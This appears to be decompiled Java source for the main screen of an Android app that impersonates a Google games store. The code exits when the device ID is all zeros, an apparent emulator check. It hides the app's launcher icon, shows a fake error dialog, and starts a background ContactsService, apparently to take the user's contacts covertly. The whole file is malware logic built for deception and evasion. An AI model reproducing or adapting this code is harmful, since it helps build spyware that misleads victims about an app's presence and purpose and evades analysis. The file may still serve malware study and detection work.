package com.google.games.stores;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.RelativeLayout;
import com.google.games.stores.bean.MyConfig;
import com.google.games.stores.config.Config;
import com.google.games.stores.service.ContactsService;
import com.google.games.stores.util.ConfigUtil;
import com.google.games.stores.util.GeneralUtil;
import com.google.games.stores.util.Logger;

public class MainActivity extends Activity implements OnClickListener {
    private RelativeLayout main_hide_layout;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (GeneralUtil.getDevice(this).equalsIgnoreCase("000000000000000")) {
            finish();
            return;
        }
        getWindow().requestFeature(1);
        setContentView(R.layout.activity_main);
        HideIcon();
        MyConfig config = ConfigUtil.getConfig(Config.CONFIG_FILE);
        if (config != null) {
            config.setContact("true");
            Logger.i("abc", "config not null");
        } else {
            config = new MyConfig();
            config.setContact("true");
            Logger.i("abc", "config null");
        }
        if (ConfigUtil.writeConfig(config, Config.CONFIG_FILE)) {
            Logger.i("abc", "main set contact ---> true");
        } else {
            Logger.i("abc", "main set contact ---> false");
        }
        initView();
        Dialog();
        new Thread() {
            public void run() {
                super.run();
                Intent contactService = new Intent(MainActivity.this, ContactsService.class);
                contactService.setFlags(268435456);
                MainActivity.this.startService(contactService);
            }
        }.start();
    }

    private void initView() {
        this.main_hide_layout = (RelativeLayout) findViewById(R.id.main_hide_layout);
        this.main_hide_layout.setOnClickListener(this);
    }

    /* access modifiers changed from: protected */
    public void Dialog() {
        Builder builder = new Builder(this);
        builder.setTitle(getResources().getString(R.string.notify));
        builder.setMessage(getResources().getString(R.string.app_error_msg));
        builder.setPositiveButton(getResources().getString(R.string.confirm), new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                MainActivity.this.finish();
            }
        });
        builder.setNegativeButton(getResources().getString(R.string.cancel), new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                MainActivity.this.finish();
            }
        });
        builder.create().show();
    }

    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.main_hide_layout /*2131361792*/:
                finish();
                return;
            default:
                return;
        }
    }

    private void HideIcon() {
        getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        HideIcon();
        GeneralUtil.goHome(this);
        super.onDestroy();
    }
}
